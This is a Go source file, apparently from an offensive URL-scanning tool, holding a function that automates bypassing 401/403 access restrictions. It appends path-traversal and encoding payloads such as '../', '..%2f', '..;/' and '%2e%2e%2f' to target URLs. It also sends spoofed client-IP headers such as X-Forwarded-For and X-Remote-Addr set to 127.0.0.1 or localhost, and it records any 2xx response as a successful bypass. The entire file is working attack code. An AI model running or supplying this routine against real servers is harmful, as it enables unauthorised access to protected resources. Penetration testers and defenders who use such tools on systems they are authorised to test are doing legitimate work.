package hqurlscann3r

import (
	"fmt"
	"net/http"
	"strings"

	"github.com/enenumxela/urlx/pkg/urlx"
)

func (hqurlscann3r *Sigurlx) bypass4xx(parsedURL *urlx.URL) ([]ClietErrorBypass, error) {
	var clietErrorBypass []ClietErrorBypass

	// Trim the trailing slash
	parsedURL.Path = strings.TrimRight(parsedURL.Path, "/")

	bypasses := []string{}

	payloads := []string{"?", "??", "???", "&", "#", "%", "%20", "%20/", "%09", "/", "//", "/.", "/~", ";/", "/..;/", "../", "..%2f", "..;/", "../", "\\..\\.\\", ".././", "..%00", "..%0d/", "..5c", "..\\", "..%ff/", "%2e%2e%2f", ".%2e/", "%3f", "%26", "%23", ".json"}

	for _, payload := range payloads {
		bypasses = append(bypasses, fmt.Sprintf("%s%s", parsedURL.String(), payload))
	}

	headers := [][]string{
		{"Forwarded", "127.0.0.1"},
		{"Forwarded", "localhost"},
		{"Forwarded-For", "127.0.0.1"},
		{"Forwarded-For", "localhost"},
		{"Forwarded-For-Ip", "127.0.0.1"},
		{"X-Client-IP", "127.0.0.1"},
		{"X-Custom-IP-Authorization", "127.0.0.1"},
		{"X-Forward", "127.0.0.1"},
		{"X-Forward", "localhost"},
		{"X-Forwarded", "127.0.0.1"},
		{"X-Forwarded", "localhost"},
		{"X-Forwarded-By", "127.0.0.1"},
		{"X-Forwarded-By", "localhost"},
		{"X-Forwarded-For", "127.0.0.1"},
		{"X-Forwarded-For", "localhost"},
		{"X-Forwarded-For-Original", "127.0.0.1"},
		{"X-Forwarded-For-Original", "localhost"},
		{"X-Forwared-Host", "127.0.0.1"},
		{"X-Forwared-Host", "localhost"},
		{"X-Host", "127.0.0.1"},
		{"X-Host", "localhost"},
		{"X-Originating-IP", "127.0.0.1"},
		{"X-Remote-IP", "127.0.0.1"},
		{"X-Remote-Addr", "127.0.0.1"},
		{"X-Remote-Addr", "localhost"},
		{"X-Forwarded-Server", "127.0.0.1"},
		{"X-Forwarded-Server", "localhost"},
		{"X-HTTP-Host-Override", "127.0.0.1"},
	}

	if parsedURL.Path != "" && parsedURL.Path != "/" {
		bypasses = append(bypasses, parsedURL.Scheme+"://"+parsedURL.Domain+"/%2e"+parsedURL.Path)
		bypasses = append(bypasses, fmt.Sprintf("%s://%s/%s//", parsedURL.Scheme, parsedURL.Domain, parsedURL.Path))
		bypasses = append(bypasses, fmt.Sprintf("%s://%s/.%s/./", parsedURL.Scheme, parsedURL.Domain, parsedURL.Path))
	}

	for _, bypass := range bypasses {
		// time.Sleep(time.Duration(o.delay) * time.Millisecond)

		res, err := hqurlscann3r.DoHTTP(bypass)
		if err != nil {
			continue
		}

		if res.StatusCode >= http.StatusOK && res.StatusCode < http.StatusMultipleChoices {
			clietErrorBypass = append(clietErrorBypass, ClietErrorBypass{URL: bypass})
		}
	}

	for j := 0; j < len(headers); j++ {
		// time.Sleep(time.Duration(o.delay) * time.Millisecond)

		res, err := hqurlscann3r.httpRequest(http.MethodGet, parsedURL.String(), map[string]string{headers[j][0]: headers[j][1]})
		if err != nil {
			continue
		}

		if res.StatusCode >= http.StatusOK && res.StatusCode < http.StatusMultipleChoices {
			clietErrorBypass = append(clietErrorBypass, ClietErrorBypass{URL: parsedURL.String(), Header: headers[j][0] + ":" + headers[j][1]})
		}
	}

	return clietErrorBypass, nil
}
